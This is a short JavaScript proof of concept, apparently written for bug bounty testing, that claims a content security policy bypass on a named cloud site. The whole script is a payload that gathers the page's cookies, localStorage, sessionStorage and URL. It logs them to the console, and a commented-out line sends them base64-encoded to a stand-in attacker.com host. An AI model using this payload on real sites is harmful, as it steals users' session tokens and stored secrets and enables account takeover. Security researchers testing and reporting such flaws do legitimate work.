// CloudQuery CSP bypass - for bug bounty testing
// This script would run in the context of cloud.cloudquery.io if loaded there
(function() {
  var d = {
    cookies: document.cookie,
    localStorage: JSON.stringify(localStorage),
    sessionStorage: JSON.stringify(sessionStorage),
    url: window.location.href,
    ts: new Date().toISOString()
  };
  // In real exploit: exfiltrate to attacker server
  // fetch('https://attacker.com/steal?d=' + btoa(JSON.stringify(d)));
  console.log('CSP BYPASS CONFIRMED - data captured:', d);
})();
